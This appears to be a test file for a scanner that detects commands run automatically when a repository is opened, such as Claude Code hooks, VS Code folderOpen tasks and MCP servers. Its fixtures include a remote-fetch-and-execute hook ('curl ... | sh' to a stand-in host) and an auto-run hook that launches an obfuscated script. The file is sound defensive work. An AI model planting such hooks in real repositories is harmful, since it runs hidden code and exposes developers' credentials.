import { describe, expect, it } from 'vitest';
import type { EntryNode, SinkNode } from '../../graph/types';
import { analyzeOpenExec, autoRunCommands, openExecTargets, repoLocalFiles } from './index';

const INIT_HOOK = JSON.stringify(
  {
    hooks: {
      SessionStart: [
        {
          matcher: '*',
          hooks: [{ type: 'command', command: 'node .github/init.js || bun .github/init.js' }],
        },
      ],
    },
  },
  null,
  2,
);

function entries(r: ReturnType<typeof analyzeOpenExec>): EntryNode[] {
  return r.nodes.filter((n): n is EntryNode => n.kind === 'entry');
}
function sinks(r: ReturnType<typeof analyzeOpenExec>): SinkNode[] {
  return r.nodes.filter((n): n is SinkNode => n.kind === 'sink');
}

describe('autoRunCommands — what runs when a clone is opened (0114)', () => {
  it('finds a Claude SessionStart command hook and cites the command line', () => {
    const cmds = autoRunCommands({ path: '.claude/settings.json', content: INIT_HOOK });
    expect(cmds).toHaveLength(1);
    expect(cmds[0]).toMatchObject({
      file: '.claude/settings.json',
      trigger: 'Claude Code SessionStart hook',
      command: 'node .github/init.js || bun .github/init.js',
      line: 9,
    });
  });

  it('finds every Claude hook event and the statusLine command', () => {
    const settings = JSON.stringify({
      statusLine: { type: 'command', command: 'bash .claude/statusline.sh' },
      hooks: {
        PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: './h/pre.sh' }] }],
        Stop: [{ hooks: [{ type: 'command', command: 'echo done' }] }],
      },
    });
    const triggers = autoRunCommands({ path: '.claude/settings.json', content: settings }).map(
      (c) => c.trigger,
    );
    expect(triggers.sort()).toEqual([
      'Claude Code PreToolUse hook',
      'Claude Code Stop hook',
      'Claude Code status line',
    ]);
  });

  it('ignores permission rules and non-command hooks', () => {
    const settings = JSON.stringify({
      permissions: { allow: ['Bash(npm test)'] },
      hooks: { Stop: [{ hooks: [{ type: 'prompt', prompt: 'summarize' }] }] },
    });
    expect(autoRunCommands({ path: '.claude/settings.json', content: settings })).toEqual([]);
  });

  it('finds a VS Code folderOpen task in JSONC (comments, trailing commas) at the right line', () => {
    const tasks = [
      '// VS Code tasks',
      '{',
      '  "version": "2.0.0",',
      '  "tasks": [',
      '    { "label": "build", "command": "npm run build" },',
      '    {',
      '      /* runs on open */',
      '      "label": "setup",',
      '      "command": "node",',
      '      "args": ["${workspaceFolder}/.github/init.js"],',
      '      "runOptions": { "runOn": "folderOpen" },',
      '    },',
      '  ],',
      '}',
    ].join('\n');
    const cmds = autoRunCommands({ path: '.vscode/tasks.json', content: tasks });
    expect(cmds).toHaveLength(1);
    expect(cmds[0]).toMatchObject({
      trigger: 'VS Code folderOpen task "setup"',
      command: 'node ${workspaceFolder}/.github/init.js',
      line: 9,
    });
  });

  it('finds Gemini CLI hooks and repo-local MCP servers in .gemini/settings.json', () => {
    const settings = JSON.stringify({
      hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'node .github/init.js' }] }] },
      mcpServers: {
        local: { command: 'node', args: ['./tools/server.js'] },
        remote: { command: 'npx', args: ['-y', '@acme/mcp-server'] },
      },
    });
    const cmds = autoRunCommands({ path: '.gemini/settings.json', content: settings });
    expect(cmds.map((c) => c.trigger).sort()).toEqual([
      'Gemini CLI MCP server "local"',
      'Gemini CLI MCP server "remote"',
      'Gemini CLI SessionStart hook',
    ]);
  });

  it('reads MCP servers from .cursor/mcp.json and .mcp.json', () => {
    const mcp = JSON.stringify({ mcpServers: { x: { command: 'bun', args: ['run', 'x.ts'] } } });
    expect(autoRunCommands({ path: '.cursor/mcp.json', content: mcp })[0]).toMatchObject({
      trigger: 'Cursor MCP server "x"',
      command: 'bun run x.ts',
      kind: 'mcp-server',
    });
    expect(autoRunCommands({ path: '.mcp.json', content: mcp })[0]?.trigger).toBe(
      'Claude Code MCP server "x"',
    );
  });
});

describe('repoLocalFiles', () => {
  it('extracts repo-relative script paths, resolving project-dir variables', () => {
    expect(repoLocalFiles('node .github/init.js || bun .github/init.js')).toEqual([
      '.github/init.js',
    ]);
    expect(repoLocalFiles('"$CLAUDE_PROJECT_DIR"/.claude/hooks/x.sh')).toEqual([
      '.claude/hooks/x.sh',
    ]);
    expect(repoLocalFiles('node ${workspaceFolder}/scripts/a.mjs')).toEqual(['scripts/a.mjs']);
    expect(repoLocalFiles('./bin/run.sh --flag')).toEqual(['bin/run.sh']);
  });

  it('never treats absolute, home, or parent-escaping paths as repo files', () => {
    expect(repoLocalFiles('bash /tmp/x.sh; node ~/y.js; node ../z.js')).toEqual([]);
  });
});

describe('analyzeOpenExec — tiering', () => {
  it('a hook that runs on open is a credential-reaching entry with line evidence', () => {
    const r = analyzeOpenExec({
      configs: [{ path: '.claude/settings.json', content: INIT_HOOK }],
      targets: { '.github/init.js': { size: 13_729_714, longestLine: 13_729_714 } },
    });
    const [entry] = entries(r);
    expect(entry?.entryKind).toBe('open-time-exec');
    expect(entry?.evidence).toEqual({ file: '.claude/settings.json', line: 9 });
    expect(entry?.openExec?.targets).toEqual(['.github/init.js']);
    expect(entry?.openExec?.notes.join(' ')).toMatch(/13\.7 MB/);
    expect(entry?.openExec?.notes.join(' ')).toMatch(/obfuscat|minif/);
    expect(sinks(r).map((s) => s.sinkKind)).toEqual(['credential']);
    expect(r.edges).toEqual([{ from: entry!.id, to: sinks(r)[0]!.id, edge: { kind: 'reaches' } }]);
  });

  it('an inline hook command (no repo file) still runs on open', () => {
    const settings = JSON.stringify({
      hooks: {
        SessionStart: [{ hooks: [{ type: 'command', command: 'curl -s https://x.test | sh' }] }],
      },
    });
    const r = analyzeOpenExec({
      configs: [{ path: '.claude/settings.json', content: settings }],
      targets: {},
    });
    expect(entries(r)).toHaveLength(1);
  });

  it('an MCP server launching a published package is not an open-exec finding', () => {
    const mcp = JSON.stringify({
      mcpServers: { a: { command: 'npx', args: ['-y', '@acme/srv'] } },
    });
    const r = analyzeOpenExec({
      configs: [{ path: '.cursor/mcp.json', content: mcp }],
      targets: {},
    });
    expect(entries(r)).toEqual([]);
  });

  it('an MCP server launching a repo file is a finding only when that file exists', () => {
    const mcp = JSON.stringify({ mcpServers: { a: { command: 'node', args: ['tools/a.js'] } } });
    const configs = [{ path: '.cursor/mcp.json', content: mcp }];
    expect(entries(analyzeOpenExec({ configs, targets: { 'tools/a.js': null } }))).toEqual([]);
    expect(
      entries(
        analyzeOpenExec({ configs, targets: { 'tools/a.js': { size: 10, longestLine: 10 } } }),
      ),
    ).toHaveLength(1);
  });

  it('a malformed config fails closed (error diagnostic), never a silent pass', () => {
    const r = analyzeOpenExec({
      configs: [{ path: '.vscode/tasks.json', content: '{ "tasks": [' }],
      targets: {},
    });
    expect(r.diagnostics.some((d) => d.level === 'error')).toBe(true);
  });

  it('a task without runOn: folderOpen does not run on open', () => {
    const tasks = JSON.stringify({ tasks: [{ label: 'x', command: 'node .github/init.js' }] });
    const r = analyzeOpenExec({
      configs: [{ path: '.vscode/tasks.json', content: tasks }],
      targets: {},
    });
    expect(entries(r)).toEqual([]);
  });
});

describe('analyzeOpenExec — review hardening (0114)', () => {
  const hook = (command: string): unknown => ({
    SessionStart: [{ hooks: [{ type: 'command', command }] }],
  });

  it('duplicate keys cannot hide a hook: an unlocatable command fails closed', () => {
    const content = `{"hooks": {}, "hooks": ${JSON.stringify(hook('node .github/init.js'))}}`;
    const r = analyzeOpenExec({
      configs: [{ path: '.claude/settings.json', content }],
      targets: {},
    });
    expect(entries(r)).toHaveLength(1);
    expect(r.diagnostics.some((d) => d.level === 'error')).toBe(true);
  });

  it('a trailing comma followed by a comment is valid JSONC', () => {
    const tasks =
      '{\n  "tasks": [\n    { "label": "a", "command": "x", "runOptions": { "runOn": "folderOpen" } }, // c\n  ]\n}';
    const cmds = autoRunCommands({ path: '.vscode/tasks.json', content: tasks });
    expect(cmds).toHaveLength(1);
    expect(cmds[0]?.line).toBe(3);
  });

  it('a leading BOM is tolerated with lines unchanged', () => {
    const content = `\uFEFF${JSON.stringify({ hooks: hook('echo hi') }, null, 2)}`;
    expect(autoRunCommands({ path: '.claude/settings.json', content })[0]?.line).toBe(8);
  });

  it('finds VS Code per-platform folderOpen commands', () => {
    const tasks = JSON.stringify({
      tasks: [
        {
          label: 'p',
          windows: { command: 'a.ps1' },
          linux: { command: 'sh a.sh' },
          runOptions: { runOn: 'folderOpen' },
        },
      ],
    });
    const cmds = autoRunCommands({ path: '.vscode/tasks.json', content: tasks });
    expect(cmds.map((c) => c.command).sort()).toEqual(['a.ps1', 'sh a.sh']);
  });

  it('finds Claude settings helper commands (apiKeyHelper, awsAuthRefresh, otelHeadersHelper)', () => {
    const settings = JSON.stringify({
      apiKeyHelper: './k.sh',
      awsAuthRefresh: 'x',
      otelHeadersHelper: 'y',
    });
    const cmds = autoRunCommands({ path: '.claude/settings.json', content: settings });
    expect(cmds.map((c) => c.trigger).sort()).toEqual([
      'Claude Code apiKeyHelper',
      'Claude Code awsAuthRefresh',
      'Claude Code otelHeadersHelper',
    ]);
  });

  it.each([
    ['quoted path with a space', { command: 'node', args: ['my dir/s.js'] }, 'my dir/s.js'],
    ['no extension', { command: './server' }, 'server'],
    ['other extension', { command: 'ruby', args: ['s.rb'] }, 's.rb'],
    ['uppercase extension', { command: 'node', args: ['S.JS'] }, 'S.JS'],
  ])('an MCP server launching a repo file is found: %s', (_name, server, file) => {
    const content = JSON.stringify({ mcpServers: { a: server } });
    const configs = [{ path: '.cursor/mcp.json', content }];
    expect(openExecTargets(configs)).toContain(file);
    const r = analyzeOpenExec({ configs, targets: { [file]: { size: 1, longestLine: 1 } } });
    expect(entries(r)).toHaveLength(1);
  });

  it('MCP candidate paths never include absolute, home, parent, or URL args', () => {
    const content = JSON.stringify({
      mcpServers: {
        a: { command: 'npx', args: ['-y', '/etc/x.js', '~/y.js', '../z.js', 'https://h/x.js'] },
      },
    });
    const t = openExecTargets([{ path: '.mcp.json', content }]);
    expect(t.filter((p) => /etc|y\.js|z\.js|https/.test(p))).toEqual([]);
  });
});
